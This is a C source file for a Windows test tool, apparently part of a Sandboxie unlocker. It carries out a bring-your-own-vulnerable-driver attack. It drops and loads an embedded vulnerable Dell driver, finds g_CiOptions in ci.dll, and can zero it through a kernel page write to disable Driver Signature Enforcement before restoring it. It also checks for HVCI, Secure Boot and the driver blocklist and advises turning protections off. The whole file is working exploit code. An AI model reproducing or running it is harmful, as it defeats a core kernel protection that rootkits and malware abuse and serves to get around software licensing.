/*
 * SbieUnlockTest - standalone feasibility probe for the BYOVD DSE patch.
 *
 * Loads the embedded Dell dbutil_2_3.sys, locates ci.dll!g_CiOptions,
 * optionally writes 0 (disables DSE), reads it back, then restores the
 * original value.  It does not touch Sandboxie itself.
 *
 * Run elevated, with HVCI (Memory Integrity) disabled.  For a meaningful
 * write test, test signing must also be disabled.
 *
 * dbutil_2_3.sys / kdrv / pagemap / sysguard code: MIT, from
 * CriDos/sandboxie_unlocker.  g_CiOptions locator: MIT, from hfiref0x/KDU.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <stdarg.h>
#include <psapi.h>

#include "log.h"
#include "kmod.h"
#include "kdrv.h"
#include "pagemap.h"
#include "dse_locate.h"

static BOOL g_doWrite = FALSE;
static BOOL g_forceTestSigning = FALSE;

static void Msg(const char* fmt, ...)
{
    va_list ap;
    char buf[1024];

    va_start(ap, fmt);
    _vsnprintf_s(buf, sizeof(buf), _TRUNCATE, fmt, ap);
    va_end(ap);

    printf("%s\n", buf);
    fflush(stdout);
    LOGI("%s", buf);
}

static void MsgErr(const char* fmt, ...)
{
    va_list ap;
    char buf[1024];

    va_start(ap, fmt);
    _vsnprintf_s(buf, sizeof(buf), _TRUNCATE, fmt, ap);
    va_end(ap);

    printf("ERROR: %s\n", buf);
    fflush(stdout);
    LOGE("%s", buf);
}

static BOOL IsElevated(void)
{
    HANDLE token = NULL;
    TOKEN_ELEVATION elevation = { 0 };
    DWORD len = 0;
    BOOL result = FALSE;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &len))
            result = elevation.TokenIsElevated;
        CloseHandle(token);
    }
    return result;
}

static ULONG GetOsBuildNumber(void)
{
    typedef LONG (WINAPI *RtlGetVersionFn)(PRTL_OSVERSIONINFOW);

    RTL_OSVERSIONINFOW vi;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    RtlGetVersionFn fn = ntdll
        ? (RtlGetVersionFn)GetProcAddress(ntdll, "RtlGetVersion")
        : NULL;

    if (!fn)
        return 0;

    RtlSecureZeroMemory(&vi, sizeof(vi));
    vi.dwOSVersionInfoSize = sizeof(vi);
    if (fn(&vi) != 0)
        return 0;
    return vi.dwBuildNumber;
}

typedef struct _CI_INFO {
    ULONG Length;
    ULONG CodeIntegrityOptions;
} CI_INFO;

static BOOL QueryCiOptions(CI_INFO* info)
{
    typedef LONG (NTAPI *NtQuerySystemInformationFn)(ULONG, PVOID, ULONG, PULONG);

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    NtQuerySystemInformationFn fn = ntdll
        ? (NtQuerySystemInformationFn)GetProcAddress(ntdll, "NtQuerySystemInformation")
        : NULL;

    if (!fn)
        return FALSE;

    RtlSecureZeroMemory(info, sizeof(*info));
    info->Length = sizeof(*info);
    return fn(103 /* SystemCodeIntegrityInformation */, info, sizeof(*info), NULL) >= 0;
}

static BOOL ReadRegDword(HKEY root, const wchar_t* subKey, const wchar_t* value,
                         DWORD* out, BOOL* present)
{
    HKEY key;
    DWORD data = 0, size = sizeof(data), type = 0;
    LSTATUS st;

    *present = FALSE;
    st = RegOpenKeyExW(root, subKey, 0, KEY_READ, &key);
    if (st != ERROR_SUCCESS)
        return FALSE;

    st = RegQueryValueExW(key, value, NULL, &type, (LPBYTE)&data, &size);
    RegCloseKey(key);

    if (st == ERROR_SUCCESS && type == REG_DWORD && size == sizeof(data)) {
        *out = data;
        *present = TRUE;
        return TRUE;
    }
    return FALSE;
}

static BOOL ExtractDriver(char* path, size_t pathLen)
{
    char winDir[MAX_PATH];
    HANDLE file;
    DWORD written = 0;
    BOOL ok;

    if (!GetWindowsDirectoryA(winDir, MAX_PATH))
        return FALSE;

    _snprintf_s(path, pathLen, _TRUNCATE,
                "%s\\Temp\\sbie_unlock_test_%lu.sys", winDir, GetCurrentProcessId());

    file = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE)
        return FALSE;

    ok = WriteFile(file, g_driver_bin, g_driver_size, &written, NULL) &&
         written == g_driver_size;
    CloseHandle(file);

    if (!ok) {
        DeleteFileA(path);
        return FALSE;
    }
    return TRUE;
}

static BOOL CiOptionsAddressLooksValid(HMODULE mapped, ULONG_PTR loadedBase, ULONG_PTR va)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mapped;
    PIMAGE_NT_HEADERS nt;
    ULONG sizeOfImage;

    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    nt = (PIMAGE_NT_HEADERS)((PBYTE)mapped + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    sizeOfImage = nt->OptionalHeader.SizeOfImage;
    if (!sizeOfImage)
        return FALSE;

    return va >= loadedBase && va < loadedBase + sizeOfImage;
}

static void PrintUsage(void)
{
    printf("Usage: SbieUnlockTest [--write] [--force-testsign]\n");
    printf("  (default)        read-only: load helper, locate g_CiOptions, read value\n");
    printf("  --write          write 0, read back, restore original, read back\n");
    printf("  --force-testsign allow --write while test signing is enabled\n");
}

int main(int argc, char** argv)
{
    int i;
    ULONG build;
    BOOL elevated;
    CI_INFO ci;
    BOOL ciOk;
    BOOL testSigning = FALSE;
    BOOL hvci = FALSE;
    DWORD secureBoot = 0, blocklist = 0;
    BOOL secureBootPresent = FALSE, blocklistPresent = FALSE;
    char tempDir[MAX_PATH];
    char driverPath[MAX_PATH];
    kdrv_t drv;
    int rc;
    ULONG64 ciBase;
    WCHAR ciPath[MAX_PATH];
    UINT sysDirLen;
    HMODULE ciMapped = NULL;
    ULONG_PTR ciOptions = 0;
    DWORD currentValue = 0, afterWrite = 0, afterRestore = 0;
    BOOL ok = FALSE;

    for (i = 1; i < argc; i++) {
        if (_stricmp(argv[i], "--write") == 0)
            g_doWrite = TRUE;
        else if (_stricmp(argv[i], "--force-testsign") == 0)
            g_forceTestSigning = TRUE;
        else if (_stricmp(argv[i], "--help") == 0 || _stricmp(argv[i], "-h") == 0) {
            PrintUsage();
            return 0;
        } else {
            PrintUsage();
            return 2;
        }
    }

    Msg("=== SbieUnlockTest (BYOVD DSE probe) ===");

    build = GetOsBuildNumber();
    Msg("OS build: %lu", build);
    Msg("Log file: %s", g_log_path[0] ? g_log_path : "(pending)");

    elevated = IsElevated();
    Msg("Elevated: %s", elevated ? "yes" : "no");

    ciOk = QueryCiOptions(&ci);
    if (ciOk) {
        testSigning = (ci.CodeIntegrityOptions & 0x2) != 0;
        hvci = (ci.CodeIntegrityOptions & 0x2000) != 0;
        Msg("CodeIntegrityOptions: 0x%08lX (test-signing=%d hvci=%d)",
            ci.CodeIntegrityOptions, testSigning, hvci);
    } else {
        MsgErr("NtQuerySystemInformation(SystemCodeIntegrityInformation) failed");
    }

    ReadRegDword(HKEY_LOCAL_MACHINE,
                 L"SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State",
                 L"UEFISecureBootEnabled", &secureBoot, &secureBootPresent);
    Msg("Secure Boot: %s", secureBootPresent ? (secureBoot ? "ON" : "off") : "unknown");

    ReadRegDword(HKEY_LOCAL_MACHINE,
                 L"SYSTEM\\CurrentControlSet\\Control\\CI\\Config",
                 L"VulnerableDriverBlocklistEnable", &blocklist, &blocklistPresent);
    Msg("Vulnerable driver blocklist: %s",
        blocklistPresent ? (blocklist ? "ON" : "off") : "not set");

    if (!elevated) {
        MsgErr("Run this tool as Administrator.");
        return 1;
    }

    if (hvci) {
        MsgErr("HVCI (Memory Integrity) is ON. Disable it, reboot, then retry.");
        return 1;
    }

    if (testSigning && g_doWrite && !g_forceTestSigning) {
        MsgErr("Test signing is ON; a DSE write test would be meaningless. "
               "Run 'bcdedit /set testsigning off', reboot, then retry "
               "(or pass --force-testsign).");
        return 1;
    }

    if (!GetWindowsDirectoryA(tempDir, MAX_PATH)) {
        MsgErr("GetWindowsDirectory failed: %lu", GetLastError());
        return 1;
    }
    strcat_s(tempDir, MAX_PATH, "\\Temp");
    cleanup_stale_temp_drivers(tempDir);

    Msg("[1] Staging embedded dbutil_2_3.sys...");
    if (!ExtractDriver(driverPath, sizeof(driverPath))) {
        MsgErr("Failed to write helper driver to %s (error %lu)", tempDir, GetLastError());
        return 1;
    }
    Msg("    staged: %s (%lu bytes)", driverPath, g_driver_size);

    Msg("[2] Loading helper driver...");
    rc = kdrv_load(&drv, driverPath);
    if (rc != 0) {
        MsgErr("Helper driver load failed (rc=%d). "
               "Check the log for StartService error 0x800B010C (blocklist/HVCI).", rc);
        return 1;
    }

    Msg("[3] Locating ci.dll...");
    ciBase = kmod_find("ci.dll");
    if (!ciBase) {
        MsgErr("ci.dll not found in the loaded kernel module list.");
        kdrv_unload(&drv);
        return 1;
    }
    Msg("    ci.dll kernel base: 0x%llX", (unsigned long long)ciBase);

    sysDirLen = GetSystemDirectoryW(ciPath, MAX_PATH);
    if (!sysDirLen || sysDirLen + 8 >= MAX_PATH) {
        MsgErr("GetSystemDirectory failed.");
        kdrv_unload(&drv);
        return 1;
    }
    wcscat_s(ciPath, MAX_PATH, L"\\ci.dll");

    ciMapped = LoadLibraryExW(ciPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!ciMapped) {
        MsgErr("LoadLibraryEx(%ls) failed: %lu", ciPath, GetLastError());
        kdrv_unload(&drv);
        return 1;
    }

    Msg("[4] Locating g_CiOptions...");
    if (!LocateCiOptions(ciMapped, (ULONG_PTR)ciBase, &ciOptions)) {
        MsgErr("%s", g_dse_locate_error);
        FreeLibrary(ciMapped);
        kdrv_unload(&drv);
        return 1;
    }
    Msg("    g_CiOptions VA: 0x%llX", (unsigned long long)ciOptions);

    if (!CiOptionsAddressLooksValid(ciMapped, (ULONG_PTR)ciBase, ciOptions)) {
        MsgErr("Resolved address is outside the ci.dll image; refusing to proceed.");
        FreeLibrary(ciMapped);
        kdrv_unload(&drv);
        return 1;
    }

    Msg("[5] Reading current value...");
    if (kdrv_read(&drv, ciOptions, &currentValue, sizeof(currentValue)) != 0) {
        MsgErr("Kernel read failed.");
        FreeLibrary(ciMapped);
        kdrv_unload(&drv);
        return 1;
    }
    Msg("    current g_CiOptions = 0x%08lX", currentValue);

    if (currentValue > 0xFFFF) {
        MsgErr("Current value looks implausible; refusing to write.");
        FreeLibrary(ciMapped);
        kdrv_unload(&drv);
        return 1;
    }

    if (!g_doWrite) {
        Msg("DRY-RUN: no write performed. Re-run with --write to test the patch.");
        ok = TRUE;
        goto cleanup;
    }

    Msg("[6] Writing 0 (disable DSE) via PTE alias...");
    {
        DWORD zero = 0;
        if (kdrv_page_write(&drv, ciOptions, &zero, sizeof(zero)) != 0) {
            MsgErr("Write failed.");
            goto cleanup;
        }
    }
    if (kdrv_read(&drv, ciOptions, &afterWrite, sizeof(afterWrite)) != 0) {
        MsgErr("Read-back after write failed.");
        goto cleanup;
    }
    Msg("    after write: 0x%08lX (expected 0x00000000)", afterWrite);

    Msg("[7] Restoring original value...");
    if (kdrv_page_write(&drv, ciOptions, &currentValue, sizeof(currentValue)) != 0) {
        MsgErr("Restore write failed; DSE may stay disabled until reboot.");
        goto cleanup;
    }
    if (kdrv_read(&drv, ciOptions, &afterRestore, sizeof(afterRestore)) != 0) {
        MsgErr("Read-back after restore failed.");
        goto cleanup;
    }
    Msg("    after restore: 0x%08lX (expected 0x%08lX)", afterRestore, currentValue);

    ok = (afterWrite == 0) && (afterRestore == currentValue);

cleanup:
    if (ciMapped)
        FreeLibrary(ciMapped);
    kdrv_unload(&drv);

    Msg("RESULT: %s", ok ? "PASS" : "FAIL");
    Msg("Log: %s", g_log_path);
    return ok ? 0 : 1;
}
